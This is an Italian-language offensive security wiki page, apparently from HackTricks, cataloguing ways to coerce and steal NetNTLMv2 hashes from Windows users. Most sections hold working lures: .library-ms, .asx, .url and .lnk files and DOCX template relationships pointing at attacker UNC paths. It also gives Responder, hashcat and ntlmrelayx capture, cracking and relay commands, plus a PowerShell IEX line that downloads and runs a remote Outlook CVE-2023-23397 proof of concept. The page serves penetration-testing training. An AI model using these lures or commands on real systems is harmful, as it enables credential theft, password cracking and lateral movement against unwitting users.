# Luoghi in cui rubare credenziali NTLM

{{#include ../../banners/hacktricks-training.md}}

**Controlla tutte le ottime idee disponibili su [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/), dal download di un file microsoft word online fino alla source dei leak ntlm: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md e [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Condivisione SMB scrivibile + lure UNC attivati da Explorer (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Se puoi **scrivere in una condivisione che gli utenti o i job pianificati esplorano in Explorer**, inserisci file i cui metadata puntano al tuo UNC (ad es. `\\ATTACKER\share`). Il rendering della cartella attiva una **autenticazione SMB implicita** e invia un **NetNTLMv2** al tuo listener.<sup>[[1]](#references)</sup>

1. **Genera i lure** (include SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/ecc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Lasciali nella share scrivibile** (qualsiasi cartella aperta dalla vittima):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Ascolta e crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows può accedere a diversi file contemporaneamente; qualsiasi elemento visualizzato in anteprima da Explorer (`BROWSE TO FOLDER`) non richiede clic.

### Playlist di Windows Media Player (.ASX/.WAX)

Se riesci a fare in modo che un target apra o visualizzi in anteprima una playlist di Windows Media Player sotto il tuo controllo, puoi effettuare un leak di Net-NTLMv2 indirizzando la voce a un percorso UNC. WMP tenterà di recuperare il media referenziato tramite SMB ed eseguirà implicitamente l'autenticazione.<sup>[[3]](#references)[[4]](#references)</sup>

Payload di esempio:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Flusso di raccolta e cracking:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer gestisce in modo non sicuro i file .library-ms quando vengono aperti direttamente da un archivio ZIP. Se la definizione della libreria punta a un percorso UNC remoto (ad esempio, \\attacker\share), la semplice esplorazione o apertura del file .library-ms all'interno dello ZIP fa sì che Explorer enumeri l'UNC e invii l'autenticazione NTLM all'attacker. Questo produce un NetNTLMv2 che può essere sottoposto a cracking offline o potenzialmente inoltrato tramite relay.<sup>[[2]](#references)</sup>

File .library-ms minimale che punta a un UNC dell'attacker
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Passaggi operativi
- Crea il file .library-ms con l’XML sopra (imposta il tuo IP/hostname).
- Comprimi il file (su Windows: Invia a → Cartella compressa) e consegna lo ZIP al target.
- Avvia un listener per la cattura NTLM e attendi che la vittima apra il file .library-ms dall’interno dello ZIP.


### Percorso del suono del promemoria del calendario di Outlook (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook per Windows elaborava la proprietà MAPI estesa PidLidReminderFileParameter negli elementi del calendario. Se questa proprietà puntava a un percorso UNC (ad esempio, \\attacker\share\alert.wav), Outlook contattava la share SMB quando scattava il promemoria, esponendo il Net-NTLMv2 dell’utente senza alcun clic. Questo problema è stato corretto il 14 marzo 2023, ma resta altamente rilevante per le fleet legacy/non aggiornate e per la risposta agli incidenti storici.<sup>[[5]](#references)</sup>

Sfruttamento rapido con PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Lato listener:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Note
- Alla vittima è sufficiente avere Outlook for Windows in esecuzione quando si attiva il promemoria.
- Il leak restituisce Net‑NTLMv2, adatto al cracking offline o al relay (non al pass-the-hash).


### .LNK/.URL icon-based zero-click NTLM leak (CVE‑2025‑50154 – bypass di CVE‑2025‑24054)

Windows Explorer esegue automaticamente il rendering delle icone dei collegamenti. Ricerche recenti hanno dimostrato che, anche dopo la patch di Microsoft dell'aprile 2025 per i collegamenti con icone UNC, era ancora possibile attivare l'autenticazione NTLM senza clic ospitando la destinazione del collegamento su un percorso UNC e mantenendo l'icona in locale (il bypass della patch ha ricevuto l'assegnazione CVE‑2025‑50154). La semplice visualizzazione della cartella fa sì che Explorer recuperi i metadati dalla destinazione remota, inviando NTLM al server SMB dell'attaccante.<sup>[[6]](#references)</sup>

Payload .url minimale per Internet Shortcut:
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Payload di collegamento a un programma (.lnk) tramite PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Idee di delivery
- Inserisci lo shortcut in uno ZIP e induci la vittima a esplorarlo.
- Posiziona lo shortcut su una share scrivibile che la vittima aprirà.
- Combinalo con altri file-esca nella stessa cartella, in modo che Explorer mostri l’anteprima degli elementi.

### No-click .LNK NTLM leak tramite il percorso dell’icona ExtraData (CVE‑2026‑25185)

Windows carica i metadati `.lnk` durante la **visualizzazione/anteprima** (rendering dell’icona), non solo durante l’esecuzione. CVE‑2026‑25185 mostra un percorso di parsing in cui i blocchi **ExtraData** fanno sì che la shell risolva un percorso dell’icona e acceda al filesystem **durante il caricamento**, emettendo NTLM outbound quando il percorso è remoto.

Condizioni chiave per l’attivazione (osservate in `CShellLink::_LoadFromStream`):
- Includere **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate per la routine di aggiornamento dell’icona).
- Includere **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) con **TargetUnicode** valorizzato.
- Il loader espande le variabili d’ambiente in `TargetUnicode` e chiama `PathFileExistsW` sul percorso risultante.

Se `TargetUnicode` risolve in un percorso UNC (ad esempio `\\attacker\share\icon.ico`), **la semplice visualizzazione di una cartella** contenente lo shortcut provoca un’autenticazione outbound. Lo stesso percorso di caricamento può essere raggiunto anche tramite **indicizzazione** e **scansione AV**, rendendolo una superficie pratica di leak no-click.<sup>[[7]](#references)</sup>

Gli strumenti di ricerca (parser/generator/UI) sono disponibili nel progetto **LnkMeMaybe** per creare/ispezionare queste strutture senza usare la GUI di Windows.<sup>[[8]](#references)</sup>


### Coercizione dell’autenticazione WebDAV / convalida delle credenziali tramite `davclnt.dll,DavSetCookie`

Il **client WebDAV** nativo può essere abusato per forzare la sessione di logon corrente ad autenticarsi verso un endpoint **HTTP/WebDAV** arbitrario:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Perché è utile:
- Contro un **server WebDAV controllato dall'attaccante**, può attivare **NTLM su HTTP** senza distribuire un client personalizzato.
- Contro **host interni**, è un modo discreto per **verificare dove vengono accettate le credenziali sottratte** prima di procedere lateralmente.<sup>[[9]](#references)</sup>
- Il comando è una buona alternativa quando l'**uscita SMB è filtrata**, ma **HTTP/WebDAV** è ancora raggiungibile.

Note operative:
- Il servizio **WebClient** deve essere in esecuzione sull'host di origine.
- `rundll32.exe` carica `davclnt.dll` e fa sì che Windows gestisca l'autenticazione WebDAV utilizzando le **credenziali dell'utente corrente**.<sup>[[10]](#references)</sup>
- Se lo punti verso un'infrastruttura sotto il tuo controllo, usa un listener/relay HTTP compatibile con NTLM, come:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
From a detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **convalida delle credenziali / preparazione a un movimento laterale simile a uno spray** rather than normal user behaviour.<sup>[[9]](#references)[[11]](#references)</sup>

### Office remote template injection (.docx/.dotm) to coerce NTLM

I documenti Office possono fare riferimento a un template esterno. Se imposti il template allegato su un percorso UNC, l'apertura del documento eseguirà l'autenticazione tramite SMB.

Modifiche minime alle relazioni DOCX (all'interno di word/):

1) Modifica word/settings.xml e aggiungi il riferimento al template allegato:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Modifica word/_rels/settings.xml.rels e fai puntare rId1337 al tuo UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Ricomprimi in .docx e consegnalo. Avvia il tuo listener SMB capture e attendi l'apertura.

Per idee post-capture sul relay o sull'abuso di NTLM, consulta:

{{#ref}}
README.md
{{#endref}}


## Riferimenti
- [1] [HTB: Breach – Lure tramite writable share + capture con Responder → crack di NetNTLMv2 → Kerberoast di svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [2] [HTB Fluffy – Auth leak tramite ZIP .library‑ms (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 fino a DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [3] [HTB: Media — NTLM leak di WMP → NTFS junction verso la webroot per RCE → FullPowers + GodPotato fino a SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [4] [Morphisec – 5 vulnerabilità NTLM: minacce di privilege escalation senza patch in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [5] [MSRC – Microsoft mitiga l'EoP di Outlook (CVE‑2023‑23397) e spiega il leak di NTLM tramite PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [6] [Cymulate – Zero-click, un solo NTLM: bypass della patch di sicurezza Microsoft (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [7] [TrustedSec – LnkMeMaybe: una review di CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [8] [Tooling LnkMeMaybe di TrustedSec](https://github.com/trustedsec/LnkMeMaybe)
- [9] [Rapid7 – Quando chiama il supporto IT: analisi di una campagna ModeloRAT, da Teams alla compromissione del dominio](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [10] [Microsoft Learn – header davclnt.h](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [11] [Splunk – richiesta WebDAV di Windows Rundll32](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
